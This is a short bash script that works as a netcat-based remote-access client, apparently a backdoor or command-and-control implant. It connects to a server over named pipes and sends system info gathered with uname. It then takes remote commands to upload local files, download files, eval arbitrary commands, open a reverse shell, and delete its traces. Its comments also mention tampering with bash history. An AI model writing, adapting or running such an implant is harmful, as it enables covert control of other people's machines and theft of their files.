# backup bash history
# connect to server
echo "backpipe"
mknod send p
mknod recv p
chmod 770 send
chmod 770 recv

echo "making connetion"
dest="127.0.0.1"
port="1234"
nc "$dest" "$port" 0<send 1>recv
export kitten=$!
echo $kitten

echo "got sysinfo"
# send platform info to server, initiate main l00p
uname -a >usr_profile
chmod 770 usr_profile
#cat /proc/cpuinfo >>usr_profile

echo "sending to server"
echo "platform" >send
cat usr_profile >send
echo EOD >send

echo "l00p"
# main loop
while true; do
	while kill -0 $kitten >/dev/null; do
		# read received data
		if read msg <recv; then
			echo "$msg"
			if echo "$msg" | grep -q "gtfo"; then
				echo "cleanup"
				kill $kitten
				rm recv
				rm send
				rm usr_profile
				rm backpipe
				# restore bash history
				exit 0
				
			elif echo "$msg" | grep -q "u *"; then
				# upload a file
				# probs spawn a new netcat for it
				echo "uploading"
				f=${msg#* }
				mknod ftp p
				nc -w0 $dest "$port" <ftp &
				echo "$myId""EOD" >ftp
				cat $f >ftp
				rm ftp
				echo $f
				
			elif echo "$msg" | grep -q "d *"; then
				# download a file
				# probs spawna new netcat for it
				echo "downloading"
				f=${msg#* }
				mknod ftp p
				nc -w0 $dest "$port" 0<ftp 1>$f &
				echo "$myId""EOD" >ftp
				rm ftp
				echo $f
				
			elif echo "$msg" | grep -q "x *"; then
				# execute a command
				# somehow redirect output to server?
				echo "executing"
				cmd=${msg#* }
				eval $cmd >send 2>&1
				echo EOD >send
				
			elif echo "$msg" | grep -q "shell"; then
				echo "shelling"
				# run a reverse shell
				mknod backpipe p
				sh -c sh 0<backpipe | nc $dest "$port" 1>backpipe &
				
			elif echo "$msg" | grep -q "id *"; then
				echo "received id"
				myId=${msg#* }
				echo $myId
				
			fi
		fi

	done
	# relaunch conn
	nc "$dest" "$port" 0<send 1>recv &
	echo "reconnect $myId""EOD" >send
	export kitten=$!
	echo $kitten
done

echo "am ded"
exit -1
